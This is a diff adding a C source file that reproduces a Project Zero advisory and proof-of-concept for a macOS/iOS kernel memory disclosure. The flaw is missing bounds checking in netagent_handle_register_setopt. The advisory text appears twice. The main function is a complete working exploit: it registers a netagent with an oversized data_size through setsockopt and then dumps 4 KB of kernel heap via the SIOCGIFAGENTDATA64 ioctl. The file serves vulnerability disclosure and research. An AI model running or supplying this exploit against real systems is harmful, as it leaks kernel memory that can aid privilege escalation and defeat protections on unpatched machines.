@@ -1,0 +1,300 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1140
+
+netagent_ctl_setopt is the setsockopt handler for netagent control sockets. Options of type
+NETAGENT_OPTION_TYPE_REGISTER are handled by netagent_handle_register_setopt. Here's the code:
+
+  static errno_t
+  netagent_handle_register_setopt(struct netagent_session *session, u_int8_t *payload,
+                  u_int32_t payload_length)
+  {
+    int data_size = 0;
+    struct netagent_wrapper *new_wrapper = NULL;
+    u_int32_t response_error = 0;
+    struct netagent *register_netagent = (struct netagent *)(void *)payload;   <----------- (a)
+
+    if (session == NULL) {
+      NETAGENTLOG0(LOG_ERR, "Failed to find session");
+      response_error = EINVAL;
+      goto done;
+    }
+
+    if (payload == NULL) {
+      NETAGENTLOG0(LOG_ERR, "No payload received");
+      response_error = EINVAL;
+      goto done;
+    }
+
+    if (session->wrapper != NULL) {
+      NETAGENTLOG0(LOG_ERR, "Session already has a registered agent");
+      response_error = EINVAL;
+      goto done;
+    }
+
+    if (payload_length < sizeof(struct netagent)) {                              <----------- (b)
+      NETAGENTLOG(LOG_ERR, "Register message size too small for agent: (%d < %d)",
+            payload_length, sizeof(struct netagent));
+      response_error = EINVAL;
+      goto done;
+    }
+
+    data_size = register_netagent->netagent_data_size;
+    if (data_size < 0 || data_size > NETAGENT_MAX_DATA_SIZE) {                      <----------- (c)
+      NETAGENTLOG(LOG_ERR, "Register message size could not be read, data_size %d",
+            data_size);
+      response_error = EINVAL;
+      goto done;
+    }
+
+    MALLOC(new_wrapper, struct netagent_wrapper *, sizeof(*new_wrapper) + data_size, M_NETAGENT, M_WAITOK);
+    if (new_wrapper == NULL) {
+      NETAGENTLOG0(LOG_ERR, "Failed to allocate agent");
+      response_error = ENOMEM;
+      goto done;
+    }
+
+    memset(new_wrapper, 0, sizeof(*new_wrapper) + data_size);
+    memcpy(&new_wrapper->netagent, register_netagent, sizeof(struct netagent) + data_size);   <------------ (d)
+
+    response_error = netagent_handle_register_inner(session, new_wrapper);
+    if (response_error != 0) {
+      FREE(new_wrapper, M_NETAGENT);
+      goto done;
+    }
+
+    NETAGENTLOG0(LOG_DEBUG, "Registered new agent");
+    netagent_post_event(new_wrapper->netagent.netagent_uuid, KEV_NETAGENT_REGISTERED, TRUE);
+
+  done:
+    return response_error;
+  }
+
+
+The payload and payload_length arguments are the socket option buffer which has be copied in to the kernel.
+
+At (a) this is cast to a struct netagent and at (b) it's checked whether the payload is big enough to contain this structure.
+Then at (c) an int read from the buffer is compared against a lower and upper bound and then used at (d) as the size of
+data to copy from inside the payload buffer. It's not checked that the payload buffer is actually big enough to contain
+data_size bytes of data though.
+
+This oob data can then be retreived by userspace via the SIOCGIFAGENTDATA64 ioctl. This poc will dump 4k of kernel heap.
+
+Tested on MacOS 10.12.3 (16D32) on MacBookPro10,1
+*/
+
+// ianbeer
+#if 0
+iOS/MacOS kernel memory disclosure due to lack of bounds checking in netagent socket option handling
+
+netagent_ctl_setopt is the setsockopt handler for netagent control sockets. Options of type
+NETAGENT_OPTION_TYPE_REGISTER are handled by netagent_handle_register_setopt. Here's the code:
+
+	static errno_t
+	netagent_handle_register_setopt(struct netagent_session *session, u_int8_t *payload,
+									u_int32_t payload_length)
+	{
+		int data_size = 0;
+		struct netagent_wrapper *new_wrapper = NULL;
+		u_int32_t response_error = 0;
+		struct netagent *register_netagent = (struct netagent *)(void *)payload;   <----------- (a)
+
+		if (session == NULL) {
+			NETAGENTLOG0(LOG_ERR, "Failed to find session");
+			response_error = EINVAL;
+			goto done;
+		}
+
+		if (payload == NULL) {
+			NETAGENTLOG0(LOG_ERR, "No payload received");
+			response_error = EINVAL;
+			goto done;
+		}
+
+		if (session->wrapper != NULL) {
+			NETAGENTLOG0(LOG_ERR, "Session already has a registered agent");
+			response_error = EINVAL;
+			goto done;
+		}
+
+		if (payload_length < sizeof(struct netagent)) {                              <----------- (b)
+			NETAGENTLOG(LOG_ERR, "Register message size too small for agent: (%d < %d)",
+						payload_length, sizeof(struct netagent));
+			response_error = EINVAL;
+			goto done;
+		}
+
+		data_size = register_netagent->netagent_data_size;
+		if (data_size < 0 || data_size > NETAGENT_MAX_DATA_SIZE) {                      <----------- (c)
+			NETAGENTLOG(LOG_ERR, "Register message size could not be read, data_size %d",
+						data_size);
+			response_error = EINVAL;
+			goto done;
+		}
+
+		MALLOC(new_wrapper, struct netagent_wrapper *, sizeof(*new_wrapper) + data_size, M_NETAGENT, M_WAITOK);
+		if (new_wrapper == NULL) {
+			NETAGENTLOG0(LOG_ERR, "Failed to allocate agent");
+			response_error = ENOMEM;
+			goto done;
+		}
+
+		memset(new_wrapper, 0, sizeof(*new_wrapper) + data_size);
+		memcpy(&new_wrapper->netagent, register_netagent, sizeof(struct netagent) + data_size);   <------------ (d)
+
+		response_error = netagent_handle_register_inner(session, new_wrapper);
+		if (response_error != 0) {
+			FREE(new_wrapper, M_NETAGENT);
+			goto done;
+		}
+
+		NETAGENTLOG0(LOG_DEBUG, "Registered new agent");
+		netagent_post_event(new_wrapper->netagent.netagent_uuid, KEV_NETAGENT_REGISTERED, TRUE);
+
+	done:
+		return response_error;
+	}
+
+
+The payload and payload_length arguments are the socket option buffer which has be copied in to the kernel.
+
+At (a) this is cast to a struct netagent and at (b) it's checked whether the payload is big enough to contain this structure.
+Then at (c) an int read from the buffer is compared against a lower and upper bound and then used at (d) as the size of
+data to copy from inside the payload buffer. It's not checked that the payload buffer is actually big enough to contain
+data_size bytes of data though.
+
+This oob data can then be retreived by userspace via the SIOCGIFAGENTDATA64 ioctl. This poc will dump 4k of kernel heap.
+
+Tested on MacOS 10.12.3 (16D32) on MacBookPro10,1
+#endif
+#include <errno.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/kern_control.h>
+#include <sys/sys_domain.h>
+#include <net/if.h>
+#include <netinet/in_var.h>
+#include <netinet6/nd6.h>
+#include <arpa/inet.h>
+#include <sys/ioctl.h>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int ctl_open(char* control_name) {
+  int           sock;
+  int           error     = 0;
+  struct ctl_info     kernctl_info;
+  struct sockaddr_ctl   kernctl_addr;
+
+  sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
+  if (sock < 0) {
+    printf("failed to open a SYSPROTO_CONTROL socket: %s\n", strerror(errno));
+    goto done;
+  }
+
+  memset(&kernctl_info, 0, sizeof(kernctl_info));
+  strlcpy(kernctl_info.ctl_name, control_name, sizeof(kernctl_info.ctl_name));
+
+  error = ioctl(sock, CTLIOCGINFO, &kernctl_info);
+  if (error) {
+    printf("Failed to get the control info for control named \"%s\": %s\n", control_name, strerror(errno));
+    goto done;
+  }
+
+  memset(&kernctl_addr, 0, sizeof(kernctl_addr));
+  kernctl_addr.sc_len = sizeof(kernctl_addr);
+  kernctl_addr.sc_family = AF_SYSTEM;
+  kernctl_addr.ss_sysaddr = AF_SYS_CONTROL;
+  kernctl_addr.sc_id = kernctl_info.ctl_id;
+  kernctl_addr.sc_unit = 0;
+
+  error = connect(sock, (struct sockaddr *)&kernctl_addr, sizeof(kernctl_addr));
+  if (error) {
+    printf("Failed to connect to the control socket: %s\n", strerror(errno));
+    goto done;
+  }
+
+done:
+  if (error && sock >= 0) {
+    close(sock);
+    sock = -1;
+  }
+
+  return sock;
+}
+
+#define NETAGENT_OPTION_TYPE_REGISTER 1
+#define NETAGENT_DOMAINSIZE   32
+#define NETAGENT_TYPESIZE   32
+#define NETAGENT_DESCSIZE   128
+
+struct netagent_req64 {
+	uuid_t		netagent_uuid;
+	char		netagent_domain[NETAGENT_DOMAINSIZE];
+	char		netagent_type[NETAGENT_TYPESIZE];
+	char		netagent_desc[NETAGENT_DESCSIZE];
+	u_int32_t	netagent_flags;
+	u_int32_t	netagent_data_size;
+	uint64_t	netagent_data __attribute__((aligned(8)));
+};
+
+struct netagent {
+	uuid_t		netagent_uuid;
+	char		netagent_domain[NETAGENT_DOMAINSIZE];
+	char		netagent_type[NETAGENT_TYPESIZE];
+	char		netagent_desc[NETAGENT_DESCSIZE];
+	u_int32_t	netagent_flags;
+	u_int32_t	netagent_data_size;
+	u_int8_t	netagent_data[0];
+};
+
+#define SIOCGIFAGENTDATA64    _IOWR('i', 168, struct netagent_req64)
+
+int main(){
+  int fd = ctl_open("com.apple.net.netagent");
+  if (fd < 0) {
+    printf("failed to get control socket :(\n");
+    return 1;
+  }
+  printf("got a control socket! %d\n", fd);
+
+  struct netagent na = {0};
+  na.netagent_uuid[0] = 123;
+  na.netagent_data_size = 4096;
+
+  int err = setsockopt(fd,
+                       SYSPROTO_CONTROL,
+                       NETAGENT_OPTION_TYPE_REGISTER,
+                       &na,
+                       sizeof(na));
+  if (err == -1) {
+    perror("setsockopt failed");
+    return 0;
+  } else {
+    printf("set the option!\n");
+  }
+
+  uint64_t* buf = malloc(4096);
+  memset(buf, 0, 4096);
+
+  struct netagent_req64 req = {0};
+  req.netagent_uuid[0] = 123;
+  req.netagent_data_size = 4096;
+  req.netagent_data = (uint64_t)buf;
+
+
+  err = ioctl(fd, SIOCGIFAGENTDATA64, &req);
+  if (err == -1) {
+    perror("get getinterface agent data failed");
+  }else {
+    printf("got something?\n");
+    for (int i = 0; i < 4096/8; i++) {
+      printf("%016llx\n", buf[i]);
+    }
+  }
+  
+
+  return 0;
+}
